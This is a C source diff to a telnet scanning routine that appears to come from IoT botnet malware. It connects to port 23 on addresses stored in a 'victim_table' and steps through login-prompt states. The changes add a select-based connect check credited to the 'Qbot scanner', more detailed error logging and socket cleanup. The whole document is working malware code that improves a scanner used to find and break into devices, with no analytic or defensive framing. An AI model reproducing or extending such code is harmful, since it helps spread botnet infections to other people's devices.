@@ -350,9 +350,13 @@ bool scan_scanner(void)
 			addrx.sin_port = htons(23);
 			memset(addrx.sin_zero, '\0', sizeof(addrx.sin_zero));
 
+			fd_set fdset;
 			struct timeval timeout;
-			timeout.tv_sec = SCAN_SCANNER_SEC;
-			timeout.tv_usec = SCAN_SCANNER_USEC;
+			timeout.tv_sec = SCAN_SCANNER_TIMEOUT_SEC;
+			timeout.tv_usec = SCAN_SCANNER_TIMEOUT_USEC;
+			struct timeval stimeout;
+			stimeout.tv_sec = SCAN_SCANNER_STIMEOUT_SEC;
+			stimeout.tv_usec = SCAN_SCANNER_STIMEOUT_USEC;
 
 			for (i = 0; i <= SCAN_SCANNER_MAXCON; i++)
 			{
@@ -377,16 +381,46 @@ bool scan_scanner(void)
 
 						if (connect(victim_table[i].sock, (struct sockaddr *)&addrx, sizeof(addrx)) == -1 && errno != EINPROGRESS)
 						{
-							printd("%d->%s Failed to connect", i, ipv4_unpack(victim_table[i].ip));
+							printd("%d->%s Failed to connect error %d: %s", i, ipv4_unpack(victim_table[i].ip), errno, strerror(errno));
 							victim_table[i].state = FINISHED;
 						}
 						else
 						{
-							victim_table[i].state = USERNAME;
+							victim_table[i].state = SELECT;
 							printd("%d->%s Connected", i, ipv4_unpack(victim_table[i].ip));
 						}
 						break;
-					} 
+					}
+					case SELECT:
+					{
+						FD_ZERO(&fdset);
+						FD_SET(victim_table[i].sock, &fdset);
+						if (select(victim_table[i].sock + 1, NULL, &fdset, NULL, &stimeout) == -1)
+						{
+							printd("%d->%s Failed to select error %d: %s", i, ipv4_unpack(victim_table[i].ip), errno, strerror(errno));
+							victim_table[i].state = FINISHED;
+						}
+						else
+						{
+							printd("%d->%s Select success", i, ipv4_unpack(victim_table[i].ip));
+							// From Qbot scanner
+							// I think it checks for erros and if thers one valopt becomes 1
+							socklen_t tmp = sizeof(int);
+							int32_t retval = 0;
+							getsockopt(victim_table[i].sock, SOL_SOCKET, SO_ERROR, (void*)(&retval), &tmp);
+							if (retval)
+							{
+								victim_table[i].state = FINISHED;
+							}
+							else
+							{
+								// Does this line remove nonblock? If so I gotta remov this
+								// fcntl(victim_table[i].sock, F_SETFL, fcntl(victim_table[i].sock, F_GETFL, NULL) & (~O_NONBLOCK));
+								victim_table[i].state = USERNAME;
+							}
+						}
+						break;
+					}
 					case USERNAME:
 					{
 						uint8_t x = scan_readuntil(victim_table[i].sock, userprompts, prompts);
@@ -478,6 +512,7 @@ _USERNAME_END:
 					{
 						printd("%d->%s Finished", i, ipv4_unpack(victim_table[i].ip));
 						_finished++;
+						close(victim_table[i].sock);
 						victim_table[i].state = END;
 						break;
 					}
